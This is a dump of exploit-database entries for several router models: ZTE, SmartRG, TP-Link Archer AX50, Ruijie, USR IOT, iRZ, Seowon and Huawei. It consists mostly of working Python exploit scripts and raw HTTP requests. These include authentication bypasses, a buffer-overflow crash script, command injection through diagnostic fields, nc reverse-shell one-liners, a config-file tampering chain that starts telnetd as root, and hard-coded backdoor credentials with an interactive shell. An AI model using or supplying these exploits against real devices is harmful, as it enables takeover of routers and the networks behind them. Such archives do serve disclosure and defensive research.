# Tested on: Debian 5.18.5","Description :
When specific http methods are listed within a security constraint,
then only those
methods are protected. Router ZTE-H108NS defines the following http
methods: GET, POST, and HEAD. HEAD method seems to fall under a flawed
operation which allows the HEAD to be implemented correctly with every
Response Status Code.
Proof Of Concept :
Below request bypasses successfully the Basic Authentication, and
grants access to the Administration Panel of the Router.
HEAD /cgi-bin/tools_admin.asp HTTP/1.1
Host: 192.168.1.1
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
DNT: 1
Connection: close
Cookie: SESSIONID=1cd6bb77
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0"
2023-03-30,DoS,Hardware,George Tsimpidas,Router ZTE-H108NS,Stack Buffer Overflow (DoS),"# Exploit Title: ZTE-H108NS -  Stack Buffer Overflow (DoS)
# Date: 19-11-2022
# Exploit Author: George Tsimpidas
# Vendor: https://www.zte.com.cn/global/
# Firmware: H108NSV1.0.7u_ZRD_GR2_A68
# Usage: python zte-exploit.py <victim-ip> <port>
# CVE: N/A
# Tested on: Debian 5.18.5
#!/usr/bin/python3","import sys
import socket
from time import sleep
host = sys.argv[1]  # Recieve IP from user
port = int(sys.argv[2])  # Recieve Port from user
junk = b""1500Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae""
* 5
buffer = b""GET /cgi-bin/tools_test.asp?testFlag=1&Test_PVC=0&pingtest_type=Yes&IP=192.168.1.1""
+ junk + b""&TestBtn=START HTTP/1.1\r\n""
buffer += b""Host: 192.168.1.1\r\n""
buffer += b""User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0)
Gecko/20100101 Firefox/91.0\r\n""
buffer += b""Accept:
text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\n""
buffer += b""Accept-Language: en-US,en;q=0.5\r\n""
buffer += b""Accept-Encoding: gzip, deflate\r\n""
buffer += b""Authorization: Basic YWRtaW46YWRtaW4=\r\n""
buffer += b""Connection: Keep-Alive\r\n""
buffer += b""Cookie:
SID=21caea85fe39c09297a2b6ad4f286752fe47e6c9c5f601c23b58432db13298f2;
_TESTCOOKIESUPPORT=1; SESSIONID=53483d25\r\n""
buffer += b""Upgrade-Insecure-Requests: 1\r\n\r\n""
print(""[*] Sending evil payload..."")
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host, port))
s.send(buffer)
sleep(1)
s.close()
print(""[+] Crashing boom boom ~ check if target is down ;)"")"
2022-11-11,Remote,Hardware,Yerodin Richards,SmartRG Router SR510n 2.6.13,Remote Code Execution,"# Exploit Title: SmartRG Router SR510n 2.6.13 - RCE (Remote Code Execution)
# Date: 13/06/2022
# Exploit Author: Yerodin Richards
# Vendor Homepage: https://adtran.com
# Version: 2.5.15 / 2.6.13 (confirmed)
# Tested on: SR506n (2.5.15) & SR510n (2.6.13)
# CVE : CVE-2022-37661","import requests
from subprocess import Popen, PIPE
router_host =3D ""http://192.168.1.1""
authorization_header =3D ""YWRtaW46QWRtMW5ATDFtMyM=3D""
lhost =3D ""lo""
lport =3D 80
payload_port =3D 81
def main():
e_proc =3D Popen([""echo"", f""rm /tmp/s & mknod /tmp/s p & /bin/sh 0< /tm=
p/s | nc {lhost} {lport} > /tmp/s""], stdout=3DPIPE)
Popen([""nc"", ""-nlvp"", f""{payload_port}""], stdin=3De_proc.stdout)
send_payload(f""|nc {lhost} {payload_port}|sh"")
print(""done.. check shell"")
def get_session():
url =3D router_host + ""/admin/ping.html""
headers =3D {""Authorization"": ""Basic {}"".format(authorization_header)}
r =3D requests.get(url, headers=3Dheaders).text
i =3D r.find(""&sessionKey=3D"") + len(""&sessionKey=3D"")
s =3D """"
while r[i] !=3D ""'"":
s =3D s + r[i]
i =3D i + 1
return s
def send_payload(payload):
print(payload)
url =3D router_host + ""/admin/pingHost.cmd""
headers =3D {""Authorization"": ""Basic {}"".format(authorization_header)}
params =3D {""action"": ""add"", ""targetHostAddress"": payload, ""sessionKey""=
: get_session()}
requests.get(url, headers=3Dheaders, params=3Dparams).text
main()"
2022-06-14,Remote,Hardware,Tomas Melicher,TP-Link Router AX50 firmware 210730,Remote Code Execution (RCE) (Authenticated),"# Exploit Title: TP-Link Router AX50 firmware 210730 - Remote Code Execution (RCE) (Authenticated)
# Exploit Author: Tomas Melicher
# Technical Details: https://github.com/aaronsvk/CVE-2022-30075
# Date: 2022-06-08
# Vendor Homepage: https://www.tp-link.com/
# Tested On: Tp-Link Archer AX50
# Vulnerability Description: Remote Code Execution via importing malicious config file
# CVE: CVE-2022-30075
#!/usr/bin/python3
# encrypt, compress each .xml using zlib and add them to tar archive
# compress tar archive using zlib and encrypt
# write into final config file
# decrypt and decompress config file
# store decrypted data into files
# untar second part of decrypted data
# decrypt and decompress each .bin file from tar archive
# https://openwrt.org/docs/guide-user/services/ddns/client#detecting_wan_ip_with_script","import argparse # pip install argparse
import requests # pip install requests
import binascii, base64, os, re, json, sys, time, math, random, hashlib
import tarfile, zlib
from Crypto.Cipher import AES, PKCS1_v1_5, PKCS1_OAEP # pip install pycryptodome
from Crypto.PublicKey import RSA
from Crypto.Util.Padding import pad, unpad
from Crypto.Random import get_random_bytes
from urllib.parse import urlencode
class WebClient(object):
def __init__(self, target, password):
self.target = target
self.password = password.encode('utf-8')
self.password_hash = hashlib.md5(('admin%s'%password).encode('utf-8')).hexdigest().encode('utf-8')
self.aes_key = (str(time.time()) + str(random.random())).replace('.','')[0:AES.block_size].encode('utf-8')
self.aes_iv = (str(time.time()) + str(random.random())).replace('.','')[0:AES.block_size].encode('utf-8')
self.stok = ''
self.session = requests.Session()
data = self.basic_request('/login?form=auth', {'operation':'read'})
if data['success'] != True:
print('[!] unsupported router')
return
self.sign_rsa_n = int(data['data']['key'][0], 16)
self.sign_rsa_e = int(data['data']['key'][1], 16)
self.seq = data['data']['seq']
data = self.basic_request('/login?form=keys', {'operation':'read'})
self.password_rsa_n = int(data['data']['password'][0], 16)
self.password_rsa_e = int(data['data']['password'][1], 16)
self.stok = self.login()
def aes_encrypt(self, aes_key, aes_iv, aes_block_size, plaintext):
cipher = AES.new(aes_key, AES.MODE_CBC, iv=aes_iv)
plaintext_padded = pad(plaintext, aes_block_size)
return cipher.encrypt(plaintext_padded)
def aes_decrypt(self, aes_key, aes_iv, aes_block_size, ciphertext):
cipher = AES.new(aes_key, AES.MODE_CBC, iv=aes_iv)
plaintext_padded = cipher.decrypt(ciphertext)
plaintext = unpad(plaintext_padded, aes_block_size)
return plaintext
def rsa_encrypt(self, n, e, plaintext):
public_key = RSA.construct((n, e)).publickey()
encryptor = PKCS1_v1_5.new(public_key)
block_size = int(public_key.n.bit_length()/8) - 11
encrypted_text = ''
for i in range(0, len(plaintext), block_size):
encrypted_text += encryptor.encrypt(plaintext[i:i+block_size]).hex()
return encrypted_text
def download_request(self, url, post_data):
res = self.session.post('http://%s/cgi-bin/luci/;stok=%s%s'%(self.target,self.stok,url), data=post_data, stream=True)
filepath = os.getcwd()+'/'+re.findall(r'(?<=filename="")[^""]+', res.headers['Content-Disposition'])[0]
if os.path.exists(filepath):
print('[!] can\'t download, file ""%s"" already exists' % filepath)
return
with open(filepath, 'wb') as f:
for chunk in res.iter_content(chunk_size=4096):
f.write(chunk)
return filepath
def basic_request(self, url, post_data, files_data={}):
res = self.session.post('http://%s/cgi-bin/luci/;stok=%s%s'%(self.target,self.stok,url), data=post_data, files=files_data)
return json.loads(res.content)
def encrypted_request(self, url, post_data):
serialized_data = urlencode(post_data)
encrypted_data = self.aes_encrypt(self.aes_key, self.aes_iv, AES.block_size, serialized_data.encode('utf-8'))
encrypted_data = base64.b64encode(encrypted_data)
signature = ('k=%s&i=%s&h=%s&s=%d'.encode('utf-8')) % (self.aes_key, self.aes_iv, self.password_hash, self.seq+len(encrypted_data))
encrypted_signature = self.rsa_encrypt(self.sign_rsa_n, self.sign_rsa_e, signature)
res = self.session.post('http://%s/cgi-bin/luci/;stok=%s%s'%(self.target,self.stok,url), data={'sign':encrypted_signature, 'data':encrypted_data}) # order of params is important
if(res.status_code != 200):
print('[!] url ""%s"" returned unexpected status code'%(url))
return
encrypted_data = json.loads(res.content)
encrypted_data = base64.b64decode(encrypted_data['data'])
data = self.aes_decrypt(self.aes_key, self.aes_iv, AES.block_size, encrypted_data)
return json.loads(data)
def login(self):
post_data = {'operation':'login', 'password':self.rsa_encrypt(self.password_rsa_n, self.password_rsa_e, self.password)}
data = self.encrypted_request('/login?form=login', post_data)
if data['success'] != True:
print('[!] login failed')
return
print('[+] logged in, received token (stok): %s'%(data['data']['stok']))
return data['data']['stok']
class BackupParser(object):
def __init__(self, filepath):
self.encrypted_path = os.path.abspath(filepath)
self.decrypted_path = os.path.splitext(filepath)[0]
self.aes_key = bytes.fromhex('2EB38F7EC41D4B8E1422805BCD5F740BC3B95BE163E39D67579EB344427F7836') # strings ./squashfs-root/usr/lib/lua/luci/model/crypto.lua
self.iv = bytes.fromhex('360028C9064242F81074F4C127D299F6') # strings ./squashfs-root/usr/lib/lua/luci/model/crypto.lua
def aes_encrypt(self, aes_key, aes_iv, aes_block_size, plaintext):
cipher = AES.new(aes_key, AES.MODE_CBC, iv=aes_iv)
plaintext_padded = pad(plaintext, aes_block_size)
return cipher.encrypt(plaintext_padded)
def aes_decrypt(self, aes_key, aes_iv, aes_block_size, ciphertext):
cipher = AES.new(aes_key, AES.MODE_CBC, iv=aes_iv)
plaintext_padded = cipher.decrypt(ciphertext)
plaintext = unpad(plaintext_padded, aes_block_size)
return plaintext
def encrypt_config(self):
if not os.path.isdir(self.decrypted_path):
print('[!] invalid directory ""%s""'%(self.decrypted_path))
return
with tarfile.open('%s/data.tar'%(self.decrypted_path), 'w') as tar:
for filename in os.listdir(self.decrypted_path):
basename,ext = os.path.splitext(filename)
if ext == '.xml':
xml_path = '%s/%s'%(self.decrypted_path,filename)
bin_path = '%s/%s.bin'%(self.decrypted_path,basename)
with open(xml_path, 'rb') as f:
plaintext = f.read()
if len(plaintext) == 0:
f = open(bin_path, 'w')
f.close()
else:
compressed = zlib.compress(plaintext)
encrypted = self.aes_encrypt(self.aes_key, self.iv, AES.block_size, compressed)
with open(bin_path, 'wb') as f:
f.write(encrypted)
tar.add(bin_path, os.path.basename(bin_path))
os.unlink(bin_path)
with open('%s/md5_sum'%(self.decrypted_path), 'rb') as f1, open('%s/data.tar'%(self.decrypted_path), 'rb') as f2:
compressed = zlib.compress(f1.read()+f2.read())
encrypted = self.aes_encrypt(self.aes_key, self.iv, AES.block_size, compressed)
with open('%s'%(self.encrypted_path), 'wb') as f:
f.write(encrypted)
os.unlink('%s/data.tar'%(self.decrypted_path))
def decrypt_config(self):
if not os.path.isfile(self.encrypted_path):
print('[!] invalid file ""%s""'%(self.encrypted_path))
return
with open(self.encrypted_path, 'rb') as f:
decrypted = self.aes_decrypt(self.aes_key, self.iv, AES.block_size, f.read())
decompressed = zlib.decompress(decrypted)
os.mkdir(self.decrypted_path)
with open('%s/md5_sum'%(self.decrypted_path), 'wb') as f:
f.write(decompressed[0:16])
with open('%s/data.tar'%(self.decrypted_path), 'wb') as f:
f.write(decompressed[16:])
with tarfile.open('%s/data.tar'%(self.decrypted_path), 'r') as tar:
tar.extractall(path=self.decrypted_path)
for filename in os.listdir(self.decrypted_path):
basename,ext = os.path.splitext(filename)
if ext == '.bin':
bin_path = '%s/%s'%(self.decrypted_path,filename)
xml_path = '%s/%s.xml'%(self.decrypted_path,basename)
with open(bin_path, 'rb') as f:
ciphertext = f.read()
os.unlink(bin_path)
if len(ciphertext) == 0:
f = open(xml_path, 'w')
f.close()
continue
decrypted = self.aes_decrypt(self.aes_key, self.iv, AES.block_size, ciphertext)
decompressed = zlib.decompress(decrypted)
with open(xml_path, 'wb') as f:
f.write(decompressed)
os.unlink('%s/data.tar'%(self.decrypted_path))
def modify_config(self, command):
xml_path = '%s/ori-backup-user-config.xml'%(self.decrypted_path)
if not os.path.isfile(xml_path):
print('[!] invalid file ""%s""'%(xml_path))
return
with open(xml_path, 'r') as f:
xml_content = f.read()
payload = '<service name=""exploit"">\n'
payload += '<enabled>on</enabled>\n'
payload += '<update_url>http://127.0.0.1/</update_url>\n'
payload += '<domain>x.example.org</domain>\n'
payload += '<username>X</username>\n'
payload += '<password>X</password>\n'
payload += '<ip_source>script</ip_source>\n'
payload += '<ip_script>%s</ip_script>\n' % (command.replace('<','<').replace('&','&'))
payload += '<interface>internet</interface>\n' # not worked for other interfaces
payload += '<retry_interval>5</retry_interval>\n'
payload += '<retry_unit>seconds</retry_unit>\n'
payload += '<retry_times>3</retry_times>\n'
payload += '<check_interval>12</check_interval>\n'
payload += '<check_unit>hours</check_unit>\n'
payload += '<force_interval>30</force_interval>\n'
payload += '<force_unit>days</force_unit>\n'
payload += '</service>\n'
if '<service name=""exploit"">' in xml_content:
xml_content = re.sub(r'<service name=""exploit"">[\s\S]+?</service>\n</ddns>', '%s</ddns>'%(payload), xml_content, 1)
else:
xml_content = xml_content.replace('</service>\n</ddns>', '</service>\n%s</ddns>'%(payload), 1)
with open(xml_path, 'w') as f:
f.write(xml_content)
arg_parser = argparse.ArgumentParser()
arg_parser.add_argument('-t', metavar='target', help='ip address of tp-link router', required=True)
arg_parser.add_argument('-p', metavar='password', required=True)
arg_parser.add_argument('-b', action='store_true', help='only backup and decrypt config')
arg_parser.add_argument('-r', metavar='backup_directory', help='only encrypt and restore directory with decrypted config')
arg_parser.add_argument('-c', metavar='cmd', default='/usr/sbin/telnetd -l /bin/login.sh', help='command to execute')
args = arg_parser.parse_args()
client = WebClient(args.t, args.p)
parser = None
if not args.r:
print('[*] downloading config file ...')
filepath = client.download_request('/admin/firmware?form=config_multipart', {'operation':'backup'})
if not filepath:
sys.exit(-1)
print('[*] decrypting config file ""%s"" ...'%(filepath))
parser = BackupParser(filepath)
parser.decrypt_config()
print('[+] successfully decrypted into directory ""%s""'%(parser.decrypted_path))
if not args.b and not args.r:
filepath = '%s_modified'%(parser.decrypted_path)
os.rename(parser.decrypted_path, filepath)
parser.decrypted_path = os.path.abspath(filepath)
parser.encrypted_path = '%s.bin'%(filepath)
parser.modify_config(args.c)
print('[+] modified directory with decrypted config ""%s"" ...'%(parser.decrypted_path))
if not args.b:
if parser is None:
parser = BackupParser('%s.bin'%(args.r.rstrip('/')))
print('[*] encrypting directory with modified config ""%s"" ...'%(parser.decrypted_path))
parser.encrypt_config()
data = client.basic_request('/admin/firmware?form=config_multipart', {'operation':'read'})
timeout = data['data']['totaltime'] if data['success'] else 180
print('[*] uploading modified config file ""%s""'%(parser.encrypted_path))
data = client.basic_request('/admin/firmware?form=config_multipart', {'operation':'restore'}, {'archive':open(parser.encrypted_path,'rb')})
if not data['success']:
print('[!] unexpected response')
print(data)
sys.exit(-1)
print('[+] config file successfully uploaded')
print('[*] router will reboot in few seconds... when it becomes online again (few minutes), try ""telnet %s"" and enjoy root shell !!!'%(args.t))"
2022-05-11,Remote,Hardware,Minh Khoa,Ruijie Reyee Mesh Router,Remote Code Execution (RCE) (Authenticated),"# Exploit Title: Ruijie Reyee Mesh Router - Remote Code Execution (RCE) (Authenticated)
# Google Dork: None
# Date: November 1, 2021
# Exploit Author: Minh Khoa of VSEC
# Vendor Homepage: https://ruijienetworks.com
# Software Link: https://www.ruijienetworks.com/resources/products/1896-1900
# Version: ReyeeOS 1.55.1915 - EW_3.0(1)B11P35 and EW_3.0(1)B11P55
# Tested on: Ruijie RG-EW1200, Ruijie RG-EW1200G PRO
# CVE: CVE-2021-43164
#!/usr/bin/python3","import os
import sys
import time
import requests
import json
def enc(PASS):
key   = ""RjYkhwzx$2018!""
shell = ""echo '{}' | openssl enc -aes-256-cbc -a -k '{}' -md md5 2>/dev/null"".format(PASS, key)
return os.popen(shell).read().strip()
try:
TARGET  = sys.argv[1]
USER    = sys.argv[2]
PASS    = sys.argv[3]
COMMAND = sys.argv[4]
except Exception:
print(""CVE-2021-43164 PoC"")
print(""Usage:   python3 exploit.py <target> <user> <pass> <command>"")
print(""Example: python3 exploit.py 192.168.110.1 admin password 'touch /tmp/pwned'"")
sys.exit(1)
endpoint = ""http://{}/cgi-bin/luci/api/auth"".format(TARGET)
payload = {
""method"": ""login"",
""params"": {
""username"": USER,
""password"": enc(PASS),
""encry"": True,
""time"": int(time.time()),
""limit"": False
r = requests.post(endpoint, json=payload)
sid = json.loads(r.text)[""data""][""sid""]
endpoint = ""http://{}/cgi-bin/luci/api/wireless?auth={}"".format(TARGET, sid)
payload = {
""method"": ""updateVersion"",
""params"": {
""jsonparam"": ""'; {} #"".format(COMMAND)
r = requests.post(endpoint, json=payload)
print(r.text)"
2022-05-11,Remote,Hardware,LiquidWorm,USR IOT 4G LTE Industrial Cellular VPN Router 1.0.36,Remote Root Backdoor,"# Exploit Title: USR IOT 4G LTE Industrial Cellular VPN Router 1.0.36 - Remote Root Backdoor
# Exploit Author: LiquidWorm
#!/usr/bin/env python3
# USR IOT 4G LTE Industrial Cellular VPN Router 1.0.36 Remote Root Backdoor
# Vendor: Jinan USR IOT Technology Limited
# Product web page: https://www.pusr.com | https://www.usriot.com
# Affected version: 1.0.36 (USR-G800V2, USR-G806, USR-G807, USR-G808)
#                   1.2.7 (USR-LG220-L)
# Summary: USR-G806 is a industrial 4G wireless LTE router which provides
# a solution for users to connect own device to 4G network via WiFi interface
# or Ethernet interface. USR-G806 adopts high performance embedded CPU which
# can support 580MHz working frequency and can be widely used in Smart Grid,
# Smart Home, public bus and Vending machine for data transmission at high
# speed. USR-G806 supports various functions such as APN card, VPN, WIFIDOG,
# flow control and has many advantages including high reliability, simple
# operation, reasonable price. USR-G806 supports WAN interface, LAN interface,
# WLAN interface, 4G interface. USR-G806 provides various networking mode
# to help user establish own network.
# Desc: The USR IOT industrial router is vulnerable to hard-coded credentials
# within its Linux distribution image. These sets of credentials are never
# exposed to the end-user and cannot be changed through any normal operation
# of the device. The 'usr' account with password 'www.usr.cn' has the highest
# privileges on the device. The password is also the default WLAN password.
# Shodan Dork: title:""usr-*""  // 4,648 ed ao 15042022
# -------------------------------------------------------------------------
# lqwrm@metalgear:~$ python usriot_root.py 192.168.0.14
# --Got rewt!
# # id;id root;pwd
# uid=0(usr) gid=0(usr)
# uid=2(root) gid=2(root) groups=2(root)
# /root
# # crontab -l
# */2 * * * * /etc/ltedial
# */20 * * * * /etc/init.d/Net_4G_Check.sh
# */15 * * * * /etc/test_log.sh
# */120 * * * * /etc/pddns/pddns_start.sh start &
# 44 4 * * * /etc/init.d/sysreboot.sh &
# */5 * * * * ps | grep ""/usr/sbin/ntpd""  && /etc/init.d/sysntpd stop;
# 0 */4 * * * /etc/init.d/sysntpd start; sleep 40; /etc/init.d/sysntpd stop;
# cat /tmp/usrlte_info
# Local time is Fri Apr 15 05:38:56 2022
# (loop)
# IMEI Number:8*************1
# Operator information:********Telecom
# signal intensity:normal(20)
# Software version number:E*****************G
# SIM Card CIMI number:4*************7
# SIM Card number:8******************6
# Short message service center number:""+8**********1""
# system information:4G Mode
# PDP protocol:""IPV4V6""
# CREG:register
# Check ME password:READY
# base station information:""4**D"",""7*****B""
# cat /tmp/usrlte_info_imsi
# 4*************7
# # exit
# lqwrm@metalgear:~$
# -------------------------------------------------------------------------
# Tested on: GNU/Linux 3.10.14 (mips)
#            OpenWrt/Linaro GCC 4.8-2014.04
#            Ralink SoC MT7628 PCIe RC mode
#            BusyBox v1.22.1
#            uhttpd
#            Lua
# Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
#                             @zeroscience
# Advisory ID: ZSL-2022-5705
# Advisory URL: https://www.zeroscience.mk/en/vulnerabilities/ZSL-2022-5705.php
# 10.04.2022","import paramiko as bah
import sys as baaaaaah
bnr='''
▄• ▄▌.▄▄ · ▄▄▄  ▪        ▄▄▄▄▄
█▪██▌▐█ ▀. ▀▄ █·██ ▪     •██
█▌▐█▌▄▀▀▀█▄▐▀▀▄ ▐█· ▄█▀▄  ▐█.▪
▐█▄█▌▐█▄▪▐█▐█•█▌▐█▌▐█▌.▐▌ ▐█▌·
▄▄▄▄·  ▄▄▄·▀ ▄▄·▀▄ •▄ ·▄▄▄▄ ▀█▄▀▪ ▀▀▀    ▄▄▄
▐█ ▀█▪▐█ ▀█ ▐█ ▌▪█▌▄▌▪██▪ ██ ▪     ▪     ▀▄ █·
▐█▀▀█▄▄█▀▀█ ██ ▄▄▐▀▀▄·▐█· ▐█▌ ▄█▀▄  ▄█▀▄ ▐▀▀▄
██▄▪▐█▐█ ▪▐▌▐███▌▐█.█▌██. ██ ▐█▌.▐▌▐█▌.▐▌▐█•█▌
·▀▀▀▀  ▀  ▀ ▄▄▄▀ ·▀  ▀▀▀▀▀▀• ▄▄▄▄▄▪ ▀█▄▀▪.▀  ▀
▀▄ █·▪     ▪     •██
▐▀▀▄  ▄█▀▄  ▄█▀▄  ▐█.▪
▐█•█▌▐█▌.▐▌▐█▌.▐▌ ▐█▌·
▄▄▄·▀ ▄▄·▀█▄▄· ▄▄▄▀..▄▄▀· .▄▄ ·
▐█ ▀█ ▐█ ▌▪▐█ ▌▪▀▄.▀·▐█ ▀. ▐█ ▀.
▄█▀▀█ ██ ▄▄██ ▄▄▐▀▀▪▄▄▀▀▀█▄▄▀▀▀█▄
▐█ ▪▐▌▐███▌▐███▌▐█▄▄▌▐█▄▪▐█▐█▄▪▐█
▀  ▀ ·▀▀▀ ·▀▀▀  ▀▀▀  ▀▀▀▀  ▀▀▀▀
print(bnr)
if len(baaaaaah.argv)<2:
print('--Gief me an IP.')
exit(0)
adrs=baaaaaah.argv[1]
unme='usr'
pwrd='www.usr.cn'
rsh=bah.SSHClient()
rsh.set_missing_host_key_policy(bah.AutoAddPolicy())
try:
rsh.connect(adrs,username=unme,password=pwrd,port=2222) #22 Ook.
print('--Got rewt!')
except:
print('--Backdoor removed.')
exit(-1)
while True:
cmnd=input('# ')
if cmnd=='exit':
rsh.exec_command('exit')
break
stdin,stdout,stderr = rsh.exec_command(cmnd)
print(stdout.read().decode().strip())
rsh.close()"
2022-03-22,Remote,Hardware,John Jackson,iRZ Mobile Router,CSRF to RCE,"# Exploit Title: iRZ Mobile Router - CSRF to RCE
# Google Dork: intitle:""iRZ Mobile Router""
# Date: 2022-03-18
# Exploit Author: Stephen Chavez & Robert Willis
# Vendor Homepage: https://en.irz.ru/
# Software Link: https://github.com/SakuraSamuraii/ez-iRZ
# Version: Routers through 2022-03-16
# Tested on: RU21, RU21w, RL21, RU41, RL01
# CVE : CVE-2022-27226","import os
import requests
import json
import subprocess
option = ""0""
def main():
print(""####################################################"")
print(""# Welcome to IRZ CSRF to RCE Exploit - version 1.0 #"")
print(""####################################################"")
print()
print(""## by RedragonX of WHG & rej_ex of SAKURA SAMURAI ##"")
print()
print(""1. Post Authentication RCE (Needs Credentials)"")
print(""2. CSRF to RCE (No Credentials)"")
print()
runit()
def runit():
option = input(""Select an option: "")
if option == ""1"":
exploit1()
elif option == ""2"":
exploit2()
else:
print(""You must select '1' or '2'. Exiting."")
def exploit1():
print(""## Running Post Auth RCE exploit"")
print()
print()
router_ip = input(""## Enter the router ip to exploit: "")
router_port = int(
input(""## Enter the victim router web page port (default is 80): "") or ""80"")
router_user = input(""## Enter the username for the router login: "")
router_pass = input(""## Enter the password for the router login: "")
LHOST = input(""## Enter the LHOST for the router reverse shell: "")
LPORT = input(""## Enter the LPORT for the router reverse shell: "")
router_url = f'http://{router_ip}:{router_port}'
nc1_str = f'Start a listener with the following command: nc -lvp {LPORT}'
input(nc1_str + ""\n\nPress enter once you do"")
send_json_payload(router_url, router_user, router_pass, LHOST, LPORT)
def send_json_payload(router_url, router_user, router_pass, lhost_ip, lhost_port):
intro = f'Sending the payload to {router_url}\n'
print(intro)
payload_str = '{""tasks"":[{""enable"":true,""minutes"":""*"",""hours"":""*"",""days"":""*"",""months"":""*"",""weekdays"":""*"",""command"":""rm /tmp/f;mknod /tmp/f p;cat /tmp/f|/bin/sh -i 2>&1|nc ' + \
f'{lhost_ip} {lhost_port} ' + \
'>/tmp/f""}],""_board"":{""name"":""RL21"",""platform"":""irz_mt02"",""time"":""Wed Mar 16 16:43:20 UTC 2022""}}'
payload_json = json.loads(payload_str)
s = requests.Session()
s.auth = (router_user, router_pass)
s.headers.update(
{""User-Agent"": ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36""})
s.headers.update({""X-Requested-With"": ""XMLHttpRequest""})
s.headers.update({""Origin"": router_url})
s.headers.update({""Referer"": router_url})
s.post(router_url + ""/api/crontab"", json=payload_json)
exploit_str = f'rm /tmp/f;mknod /tmp/f p;cat /tmp/f|/bin/sh -i 2>&1|nc {lhost_ip} 443 >/tmp/f'
print(
""Request sent! You may have to wait about 2 minutes to get a shell. \nFirst shell will die due to crontab job. Start a new listener on a new port [e.g. 443], and run the following command: "" + exploit_str)
print(""To fix TTY: type telnet 0.0.0.0 in the shell"")
def exploit2():
print(""## Running CSRF to RCE exploit"")
print()
print()
router_ip = input(""## Enter the router ip to exploit: "")
router_port = int(
input(""## Enter the victim router web page port (default is 80): "") or ""80"")
LHOST = input(""## Enter the LHOST for the router reverse shell: "")
LPORT = input(""## Enter the LPORT for the router reverse shell: "")
load_csrf_poc_file(router_ip, router_port, LHOST, LPORT)
def load_csrf_poc_file(router_ip, router_port, lhost_ip, lhost_port):
file_path = os.path.dirname(__file__) + os.sep + ""poc.template.html""
if os.path.isfile(file_path):
with open(file_path) as poc_file:
original_poc_data_str = poc_file.read()
new_html = original_poc_data_str.replace(""{router_ip}"", router_ip)
new_html = new_html.replace(
""{router_port}"", str(router_port))
lhost_split_arr = lhost_ip.split(""."")
if len(lhost_split_arr) == 4:
new_html = new_html.replace(
""{lhost_ip_octect_1}"", lhost_split_arr[0])
new_html = new_html.replace(
""{lhost_ip_octect_2}"", lhost_split_arr[1])
new_html = new_html.replace(
""{lhost_ip_octect_3}"", lhost_split_arr[2])
new_html = new_html.replace(
""{lhost_ip_octect_4}"", lhost_split_arr[3])
new_html = new_html.replace(
""{lhost_port}"", lhost_port)
new_file_path = os.path.dirname(
__file__) + os.sep + ""poc.new.html""
try:
with open(new_file_path, 'w') as new_file:
new_file.write(new_html)
print()
print(
f'New file written to {new_file_path}. Host this file')
except FileNotFoundError:
print(""You had an error writing to the file, doesn't exist."")
else:
print(f'{lhost_ip} is not a proper IPV4 address.')
else:
print(f'{file_path} not found')
main()"
2022-03-11,Remote,Hardware,Aryan Chehreghani,Seowon SLR-120 Router,Remote Code Execution (Unauthenticated),"# Exploit Title: Seowon SLR-120 Router - Remote Code Execution (Unauthenticated)
# Date: 2022-03-11
# Exploit Author: Aryan Chehreghani
# Vendor Homepage: http://www.seowonintech.co.kr
# Software Link: http://www.seowonintech.co.kr/en/product/detail.asp?num=126&big_kind=B05&middle_kind=B05_30
# Version: All version
# Tested on: Windows 10 Enterprise x64 , Linux
# CVE : CVE-2020-17456
# [ About - Seowon SLR-120 router ]:
#The SLR-120 series are provide consistent access to LTE networks and transforms it to your own hotspot while being mobile,
#The convenience of sharing wireless internet access invigorates your lifestyle, families,
#friends and workmates. Carry it around to boost your active communication anywhere.
# [ Description ]:
#Execute commands without authentication as admin user ,
#To use it in all versions, we only enter the router ip & Port(if available) in the script and Execute commands with root user.
# [ Vulnerable products ]:
#SLR-120S42G
#SLR-120D42G
#SLR-120T42G
#    Seowon SLR-120S42G router - RCE (Unauthenticated)    #
#                  BY:Aryan Chehreghani                   #
#        Team:TAPESH DIGITAL SECURITY TEAM IRAN           #
#             mail:aryanchehreghani@yahoo.com              #
#                 -+-USE:python script.py                 #
#         Example Target : http://192.168.1.1:443/        #","import requests
print ('''
url = input (""=> Enter Target : "")
while(True):
try:
cmd = input (""~Enter Command $ "")
header = {
""User-Agent"": ""Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:98.0) Gecko/20100101 Firefox/98.0"",
""Accept"": ""*/*"",
""Accept-Language"": ""en-US,en;q:0.5"",
""Accept-Encoding"": ""gzip, deflate"",
""Content-Type"": ""application/x-www-form-urlencoded"",
""Content-Length"": ""207"",
""Origin"": ""http://192.168.1.1"",
""Connection"": ""close"",
""Referer"": ""http://192.168.1.1/"",
""Upgrade-Insecure-Requests"": ""1""
datas = {
'Command':'Diagnostic',
'traceMode':'ping',
'reportIpOnly':'',
'pingIpAddr':';'+cmd,
'pingPktSize':'56',
'pingTimeout':'30',
'pingCount':'4',
'maxTTLCnt':'30',
'queriesCnt':'3',
'reportIpOnlyCheckbox':'on',
'logarea':'com.cgi',
'btnApply':'Apply',
'T':'1646950471018'
x = requests.post(url+'/cgi-bin/system_log.cgi?',data=datas)
print(x.text)
except:
break"
2022-02-02,WebApps,Hardware,Abdalrahman Gamal,Huawei DG8045 Router 1.0,Credential Disclosure,"# Title: Huawei DG8045 Router 1.0 - Credential Disclosure
# Date: 2020-06-24
# Author: Abdalrahman Gamal
# Vendor Homepage: www.huawei.com
# Version: dg8045
# HardwareVersion: VER.A
# CVE: N/A
#POC:","The default password of this router is the last 8 characters of the
device's serial number which exist in the back of the device.
An attacker can leak the serial number via the web app API like the
following:
************************Request************************
GET /api/system/deviceinfo HTTP/1.1
Host: 192.168.1.1
